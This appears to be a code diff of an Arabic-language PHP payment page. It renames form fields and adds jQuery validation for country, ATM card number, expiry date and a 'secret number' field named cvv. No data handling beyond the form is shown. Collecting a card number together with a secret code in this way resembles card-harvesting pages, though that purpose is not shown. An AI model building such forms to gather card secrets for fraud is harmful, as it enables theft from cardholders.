@@ -63,7 +63,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <span class="text-blue">يرجى اختيار البلد</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-8">
-                                    <select class="form-select" id="fullWidthDropdown" name="countries" aria-label="Select an option">
+                                    <select class="form-select"  name="contry" id="contry" aria-label="Select an option">
                                         <option value="" disabled selected hidden>ارجو اختيار البلد</option>
                                         <?php foreach($contraies as $c){echo "<option value='$c'>$c</option>";}?> 
                                     </select>
@@ -77,11 +77,11 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <span class="text-blue">رقم بطاقة الصراف الألي</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-4">
-                                    <input type="text" class="form-control" name="cardNumber" placeholder="رقم بطاقة الصراف الألي">
+                                    <input type="text" class="form-control" name="cardNumber"  id="cardNumber" placeholder="رقم بطاقة الصراف الألي">
                                 </div>
                                 <div class="col-4">
-                                    <select class="form-select" id="fullWidthDropdown" name="options" aria-label="Select an option">
-                                        <option value="" disabled selected hidden>Select an option</option> <!-- Placeholder option -->
+                                    <select class="form-select"  name="bada" aria-label="Select an option">
+                                        <option value="" disabled selected hidden>بادئة</option> <!-- Placeholder option -->
                                         <option value="1">Option 1</option>
                                         <option value="2">Option 2</option>
                                         <option value="3">Option 3</option>
@@ -96,7 +96,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     <span class="text-blue">تاريخ الأنتهاء</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-2">
-                                    <select class="form-select " id="selectMonth" name="month" aria-label="MM">
+                                    <select class="form-select " id="month" name="month" aria-label="MM">
                                         <option value="" disabled selected hidden>MM</option>
                                         <?php for ($i = 1; $i <= 12; $i++) { echo "<option value='$i'>$i</option>"; } ?>
                                         <!-- <option value="1">January</option>
@@ -114,7 +114,7 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                                     </select>
                                 </div>
                                 <div class="col-2">
-                                    <select class="form-select w-100" id="selectYear" name="year" aria-label="Select Year">
+                                    <select class="form-select w-100" id="year" name="year" aria-label="Select Year">
                                         <option value="" disabled selected hidden>YY</option>
                                         <!-- Generate years dynamically if needed -->
                                          <?php for ($i = 2023; $i <= 2030; $i++) { echo "<option value='$i'>$i</option>"; } ?>
@@ -134,10 +134,10 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
                         <li class="list-group-item">
                             <div class="row">
                                 <div class="col-4">
-                                    <span class="text-blue">تاريخ الأنتهاء</span> <!-- Aligns to the left -->
+                                    <span class="text-blue">الرقم السري</span> <!-- Aligns to the left -->
                                 </div>
                                 <div class="col-8">
-                                    <input type="text" class="form-control" placeholder="Enter your name">
+                                    <input type="text" class="form-control" name="cvv" id="cvv" placeholder="الرقم السري">
                                 </div>
                             </div>
                         </li>
@@ -169,24 +169,54 @@ $contraies=array("الكويت","مصر","السعودية","العراق","لب
     $(document).ready(function() {
       $('#send-data').click(function(e) {
         e.preventDefault();
+        var isValid = true;
+        var contry = $('#contry').val();
 
-        $('#payment-form').submit();
 
         // Simple validation
-        var name = $('#name').val();
-        var email = $('#email').val();
-        var isValid = true;
+        var name = $('#cardNumber').val();
+        // var email = $('#email').val();
+  
 
-        // Check if name is filled
-        if (name === "") {
-          alert("Please enter your name.");
+       var month = $('#month').val();
+
+    
+       var year = $('#year').val();
+       var cvv = $('#cvv').val();
+    
+       if (contry === "" || contry === null) {
+          alert("الرجاء ادخال الدولة.");
           isValid = false;
+          return "";
         }
 
-        // Check if email is valid
-        if (email === "" || !validateEmail(email)) {
-          alert("Please enter a valid email.");
+      
+        // Check if name is filled
+        if (name === "" || name === null) {
+          alert("الرجاء ادخال الاسم.");
           isValid = false;
+          return "";
+        }
+
+    
+
+
+        if (month === "" || month === null) {
+          alert("الرجاء ادخال الشهر.");
+          isValid = false;
+          return "";
+        }
+
+        if (year === "" || year === null) {
+          alert("الرجاء ادخال السنة.");
+          isValid = false;
+          return "";
+        }
+
+        if (cvv === ""  || cvv === null) {
+          alert("الرجاء ادخال الرقم السري.");
+          isValid = false;
+          return "";
         }
 
         // Submit form if valid
